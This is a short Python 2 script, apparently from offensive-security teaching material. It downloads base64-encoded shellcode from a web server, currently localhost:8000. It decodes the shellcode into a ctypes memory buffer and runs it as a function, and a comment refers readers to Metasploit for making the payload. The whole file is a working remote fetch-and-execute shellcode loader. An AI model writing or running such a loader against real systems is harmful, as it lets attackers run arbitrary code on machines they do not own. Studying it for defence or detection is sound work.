'''shell exec'''
''' PREREQUISITE: Learn windows shellcode generation using metasploit or similar
    https://www.offensive-security.com/metasploit-unleashed/generating-payloads/'''
import urllib2
import ctypes
import base64

def main(url):
    '''main func'''
    # retrieve the shellcode from our web server
    response = urllib2.urlopen(url)
    # decode  the shellcode from base64
    shellcode = base64.b64decode(response.read())
    # create a buffer in memory
    shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
    # create a function pointer to our shellcode
    shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_voidp))
    # call our shellcode
    shellcode_func()
main('http://localhost:8000/shellcode.bin')
